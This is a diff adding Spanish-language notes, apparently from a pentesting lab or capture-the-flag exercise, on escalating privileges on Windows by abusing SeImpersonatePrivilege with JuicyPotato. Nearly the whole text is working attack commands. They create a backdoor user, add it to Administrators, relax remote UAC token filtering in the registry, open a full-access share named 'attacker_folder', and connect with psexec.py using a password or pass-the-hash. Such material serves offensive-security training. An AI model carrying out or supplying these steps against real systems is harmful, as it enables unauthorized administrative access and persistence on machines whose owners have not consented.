@@ -1,0 +1,47 @@
+# Creando un usuario privilegiado gracias al SetImpersonatePrivilage
+
+[!] En el caso de que el primer comando de un error {COM -> recv failed with error: 10038}. Lo que tendremos que hacer sera lo siguiente.
+   1. Este error sale debido al parametro -c que es el CLSID, esto es debido al tipo de Windows que estamos tocando, si estamos contra un Enterprise nos podra saltar este error
+   2. Nos iremos a la pagina web del JuicyPotato que es esta -> https://github.com/ohpe/juicy-potato
+   3. Iremos al apartado de CLSID -> https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
+   4. Aqui veremos los CLSID de cada tipo de entorno de Windows 10
+   5. Los recomendables son los de XblGameSave(LocalService), ya que los otros no suelen funcionar
+   6. Code -> -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+
+
+1.Primero deberemos de crear el usuario en mi caso estoy explotando la vulnerabilidad del SetImpersonatePrivilage
+
+CODE -> JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user rami rami1234!# /add" -l 1337
+
+2.Meter al usuario creado en el grupo de Administradores
+
+CODE -> JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators rami /add" -l 1337
+
+[En el caso de que aun no seas un usuario Pwned deberemos de tocar el regedit]
+
+3. Deberemos de configurar un parametro en el regedit para hacerlo un usuario con privilegios
+
+CODE -> JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
+
+
+*(En el caso de que al hacer el psexec.py y no nos conecte por que no se pueda conectar al grupo de dominio tendremos que hacer el nuestro de esta manera)
+
+CODE -> JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
+
+[Despues de esto tendremos que poner este comando en nuestro sistema]
+[Nos metemos en el TEMP debido a que no pudimos acceder a trabes de el dominio WORKGROUP]
+[En el hash puedes poner hash o la contrasena]
+
+CODE_NUESTROSISTEMA -> 
+  
+  # Primero intentar entrar por WORKGROUP
+
+  psexec.py WORKGROUP/rami@10.10.10.63 cmd.exe
+
+  # En caso de que no te deje vas por el TEMP que fue el attacker_folder que creamos como respaldo
+
+  #OPCIONES {}
+
+psexec.py TEMP/rami@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00 {Meterte con un HASH}
+
+psexec.py TEMP/rami@10.10.10.63 cmd.exe
